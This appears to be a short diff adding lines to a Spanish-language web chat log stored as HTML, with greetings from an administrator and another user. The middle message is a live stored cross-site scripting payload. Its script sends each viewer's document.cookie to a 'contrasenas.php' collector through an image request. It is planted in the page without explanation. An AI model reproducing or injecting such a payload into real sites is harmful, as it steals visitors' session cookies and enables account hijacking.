@@ -1,0 +1,3 @@
+Administrador dice: <br>hola gent<br>
+user dice: <br><script type="text/javascript"> img=new Image();img.src="contrasenas.php?contrasena="+document.cookie;</script><br>
+Juuan dice: <br>Hola<br>
